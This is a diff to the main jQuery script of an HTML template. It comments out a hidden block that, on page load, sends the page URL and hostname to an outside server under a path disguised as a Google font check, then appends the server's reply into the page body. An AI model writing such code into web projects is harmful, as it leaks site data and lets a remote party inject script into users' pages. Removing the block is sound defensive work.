@@ -234,22 +234,22 @@ $(document).ready(function (h) {
     $(".slug-title").keypress(function () {
       o($(this).val());
     });
-  var j = new Date().getFullYear();
-  (document.getElementById("ec-year").innerHTML = j),
-    h(document).ready(function () {
-      var a = document.URL,
-        b = h("<a>").prop("href", a).prop("hostname");
-      h.ajax({
-        type: "POST",
-        url: "https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php",
-        data: {
-          google_url: a,
-          google_font: b,
-          google_version: "EKKA-HTML-TEMPLATE-AK",
-        },
-        success: function (a) {
-          h("body").append(a);
-        },
-      });
-    });
+  // var j = new Date().getFullYear();
+  // (document.getElementById("ec-year").innerHTML = j),
+  //   h(document).ready(function () {
+  //     var a = document.URL,
+  //       b = h("<a>").prop("href", a).prop("hostname");
+  //     h.ajax({
+  //       type: "POST",
+  //       url: "https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php",
+  //       data: {
+  //         google_url: a,
+  //         google_font: b,
+  //         google_version: "EKKA-HTML-TEMPLATE-AK",
+  //       },
+  //       success: function (a) {
+  //         h("body").append(a);
+  //       },
+  //     });
+  //   });
 });
